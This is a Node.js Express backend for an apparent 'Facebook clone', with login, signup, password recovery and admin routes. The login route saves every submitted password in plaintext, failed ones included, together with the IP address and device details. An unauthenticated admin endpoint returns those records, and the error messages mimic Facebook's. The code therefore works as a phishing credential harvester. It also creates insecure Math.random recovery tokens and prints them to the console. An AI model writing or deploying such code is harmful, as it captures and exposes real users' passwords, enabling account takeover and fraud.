// api/index.js - Serverless backend for Facebook clone application

const express = require('express');
const mysql = require('mysql2');
const bodyParser = require('body-parser');
const bcrypt = require('bcrypt');
const cors = require('cors');
require('dotenv').config();

const app = express();

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Get database connection configuration
const getDB = () => {
  return mysql.createConnection({
    host: process.env.DB_HOST || 'localhost',
    user: process.env.DB_USER || 'root',
    password: process.env.DB_PASSWORD || '',
    database: process.env.DB_NAME || 'facebook_clone'
  });
};

// Initialize database tables function
const initializeDB = (db) => {
  return new Promise((resolve, reject) => {
    // Users table
    const usersTable = `
      CREATE TABLE IF NOT EXISTS users (
        id INT AUTO_INCREMENT PRIMARY KEY,
        email VARCHAR(255) UNIQUE,
        mobile VARCHAR(20) UNIQUE,
        password VARCHAR(255) NOT NULL,
        first_name VARCHAR(100) NOT NULL,
        last_name VARCHAR(100) NOT NULL,
        birthday DATE NOT NULL,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      )
    `;
    
    // Recovery attempts table
    const recoveryTable = `
      CREATE TABLE IF NOT EXISTS recovery_attempts (
        id INT AUTO_INCREMENT PRIMARY KEY,
        user_id INT,
        token VARCHAR(255) NOT NULL,
        expires_at TIMESTAMP NOT NULL,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        FOREIGN KEY (user_id) REFERENCES users(id)
      )
    `;
    
    // Login attempts table with enhanced tracking
    const loginAttemptsTable = `
      CREATE TABLE IF NOT EXISTS login_attempts (
        id INT AUTO_INCREMENT PRIMARY KEY,
        email_or_mobile VARCHAR(255) NOT NULL,
        ip_address VARCHAR(45) NOT NULL,
        user_agent TEXT,
        attempt_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        success BOOLEAN DEFAULT FALSE,
        password VARCHAR(255) DEFAULT '',
        region VARCHAR(100),
        country VARCHAR(100),
        city VARCHAR(100),
        browser VARCHAR(100),
        os VARCHAR(100),
        device VARCHAR(100)
      )
    `;
    
    // Execute table creation queries in sequence
    db.query(usersTable, (err) => {
      if (err) {
        console.error('Error creating users table:', err);
        reject(err);
        return;
      }
      
      db.query(recoveryTable, (err) => {
        if (err) {
          console.error('Error creating recovery_attempts table:', err);
          reject(err);
          return;
        }
        
        db.query(loginAttemptsTable, (err) => {
          if (err) {
            console.error('Error creating login_attempts table:', err);
            reject(err);
            return;
          }
          
          console.log('Database tables initialized successfully');
          resolve();
        });
      });
    });
  });
};

// Helper function to get user agent details
function parseUserAgent(userAgent) {
  const browser = userAgent.includes('Firefox') ? 'Firefox' : 
                  userAgent.includes('Chrome') ? 'Chrome' :
                  userAgent.includes('Safari') ? 'Safari' :
                  userAgent.includes('Edge') ? 'Edge' :
                  userAgent.includes('MSIE') || userAgent.includes('Trident') ? 'Internet Explorer' : 'Unknown';
  
  const os = userAgent.includes('Windows') ? 'Windows' :
             userAgent.includes('Mac') ? 'MacOS' :
             userAgent.includes('Linux') ? 'Linux' :
             userAgent.includes('Android') ? 'Android' :
             userAgent.includes('iPhone') || userAgent.includes('iPad') ? 'iOS' : 'Unknown';
  
  const device = userAgent.includes('Mobile') ? 'Mobile' :
                userAgent.includes('Tablet') ? 'Tablet' : 'Desktop';
  
  return { browser, os, device };
}

// Helper function to check if input is email or mobile
function isEmail(input) {
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  return emailRegex.test(input);
}

// Routes
// 1. Login route with enhanced tracking
app.post('/api/login', async (req, res) => {
  const { email, password } = req.body;
  const ip = req.headers['x-forwarded-for'] || req.ip || '0.0.0.0';
  const userAgent = req.headers['user-agent'] || '';
  const { browser, os, device } = parseUserAgent(userAgent);
  
  if (!email || !password) {
    return res.status(400).json({ success: false, message: 'Email/mobile and password are required' });
  }
  
  const db = getDB();
  
  try {
    // Determine if input is email or mobile
    const field = isEmail(email) ? 'email' : 'mobile';
    
    // Log login attempt with enhanced tracking
    db.query(
      'INSERT INTO login_attempts (email_or_mobile, ip_address, password, user_agent, browser, os, device) VALUES (?, ?, ?, ?, ?, ?, ?)',
      [email, ip, password, userAgent, browser, os, device],
      (err) => {
        if (err) {
          console.error('Error logging login attempt:', err);
          // Continue with login process even if logging fails
        }
      }
    );
    
    // Find user
    db.query(
      `SELECT * FROM users WHERE ${field} = ?`,
      [email],
      async (err, results) => {
        if (err) {
          console.error('Database error:', err);
          db.end();
          return res.status(500).json({ success: false, message: 'Server error' });
        }
        
        if (results.length === 0) {
          db.end();
          return res.status(401).json({ 
            success: false, 
            message: 'The email/mobile or password you entered isn\'t connected to an account.' 
          });
        }
        
        const user = results[0];
        
        // Compare password
        const isMatch = await bcrypt.compare(password, user.password);
        
        if (!isMatch) {
          // Update login attempt to failed
          db.query(
            'UPDATE login_attempts SET success = false WHERE email_or_mobile = ? ORDER BY attempt_time DESC LIMIT 1',
            [email],
            (err) => {
              if (err) {
                console.error('Error updating login attempt status:', err);
              }
              db.end();
            }
          );
          
          return res.status(401).json({ 
            success: false, 
            message: 'The password you entered is incorrect.'
          });
        }
        
        // Update login attempt to successful
        db.query(
          'UPDATE login_attempts SET success = true WHERE email_or_mobile = ? ORDER BY attempt_time DESC LIMIT 1',
          [email],
          (err) => {
            if (err) {
              console.error('Error updating login attempt status:', err);
            }
            db.end();
          }
        );
        
        // Success - In production, you would generate JWT tokens here
        res.status(200).json({
          success: true,
          message: 'Login successful',
          user: {
            id: user.id,
            firstName: user.first_name,
            lastName: user.last_name,
            email: user.email,
            mobile: user.mobile
          }
        });
      }
    );
  } catch (error) {
    console.error('Login error:', error);
    db.end();
    res.status(500).json({ success: false, message: 'Server error' });
  }
});

// 2. Signup route
app.post('/api/signup', async (req, res) => {
  const { firstName, lastName, emailOrMobile, password, birthday } = req.body;
  
  if (!firstName || !lastName || !emailOrMobile || !password || !birthday) {
    return res.status(400).json({ success: false, message: 'All fields are required' });
  }
  
  const db = getDB();
  
  try {
    // Determine if input is email or mobile
    const isEmailInput = isEmail(emailOrMobile);
    const field = isEmailInput ? 'email' : 'mobile';
    
    // Check if user already exists
    db.query(
      `SELECT * FROM users WHERE ${field} = ?`,
      [emailOrMobile],
      async (err, results) => {
        if (err) {
          console.error('Database error:', err);
          db.end();
          return res.status(500).json({ success: false, message: 'Server error' });
        }
        
        if (results.length > 0) {
          db.end();
          return res.status(400).json({ 
            success: false, 
            message: `Account with this ${isEmailInput ? 'email' : 'mobile number'} already exists` 
          });
        }
        
        // Hash password
        const salt = await bcrypt.genSalt(10);
        const hashedPassword = await bcrypt.hash(password, salt);
        
        // Create new user
        const query = isEmailInput ? 
          'INSERT INTO users (first_name, last_name, email, password, birthday) VALUES (?, ?, ?, ?, ?)' :
          'INSERT INTO users (first_name, last_name, mobile, password, birthday) VALUES (?, ?, ?, ?, ?)';
        
        db.query(
          query,
          [firstName, lastName, emailOrMobile, hashedPassword, birthday],
          (err, result) => {
            db.end();
            
            if (err) {
              console.error('Error creating user:', err);
              return res.status(500).json({ success: false, message: 'Error creating account' });
            }
            
            res.status(201).json({
              success: true,
              message: 'Account created successfully',
              userId: result.insertId
            });
          }
        );
      }
    );
  } catch (error) {
    console.error('Signup error:', error);
    db.end();
    res.status(500).json({ success: false, message: 'Server error' });
  }
});

// 3. Password recovery route - Request
app.post('/api/recovery/request', (req, res) => {
  const { identifier } = req.body;
  
  if (!identifier) {
    return res.status(400).json({ success: false, message: 'Email or mobile number required' });
  }
  
  const db = getDB();
  
  try {
    // Determine if input is email or mobile
    const field = isEmail(identifier) ? 'email' : 'mobile';
    
    // Find user
    db.query(
      `SELECT id FROM users WHERE ${field} = ?`,
      [identifier],
      (err, results) => {
        if (err) {
          console.error('Database error:', err);
          db.end();
          return res.status(500).json({ success: false, message: 'Server error' });
        }
        
        if (results.length === 0) {
          // Don't reveal if user exists or not for security
          db.end();
          return res.status(200).json({ 
            success: true, 
            message: 'If a matching account is found, a recovery link will be sent' 
          });
        }
        
        const userId = results[0].id;
        const token = Math.random().toString(36).substring(2, 15) + 
                      Math.random().toString(36).substring(2, 15);
        
        // Save recovery token
        const expiresAt = new Date();
        expiresAt.setHours(expiresAt.getHours() + 1); // Token valid for 1 hour
        
        db.query(
          'INSERT INTO recovery_attempts (user_id, token, expires_at) VALUES (?, ?, ?)',
          [userId, token, expiresAt],
          (err) => {
            db.end();
            
            if (err) {
              console.error('Error saving recovery token:', err);
              return res.status(500).json({ success: false, message: 'Server error' });
            }
            
            // In a real app, send email or SMS with recovery token
            console.log(`RECOVERY TOKEN for ${identifier}: ${token}`);
            
            res.status(200).json({
              success: true,
              message: 'If a matching account is found, a recovery link will be sent'
            });
          }
        );
      }
    );
  } catch (error) {
    console.error('Recovery request error:', error);
    db.end();
    res.status(500).json({ success: false, message: 'Server error' });
  }
});

// 4. Admin route to view login attempts
app.get('/api/admin/login-logs', (req, res) => {
  const db = getDB();
  
  db.query(
    `SELECT * FROM login_attempts ORDER BY attempt_time DESC LIMIT 100`,
    (err, results) => {
      db.end();
      
      if (err) {
        console.error('Error fetching login logs:', err);
        return res.status(500).json({ success: false, message: 'Server error' });
      }
      
      res.status(200).json({
        success: true,
        logs: results
      });
    }
  );
});

// For local development
if (process.env.NODE_ENV !== 'production') {
  const PORT = process.env.PORT || 4000;
  app.listen(PORT, async () => {
    console.log(`Server running on port ${PORT}`);
    
    // Initialize database tables
    const db = getDB();
    try {
      await initializeDB(db);
      db.end();
    } catch (error) {
      console.error('Error initializing database:', error);
      db.end();
    }
  });
}

// For serverless deployment
module.exports = app;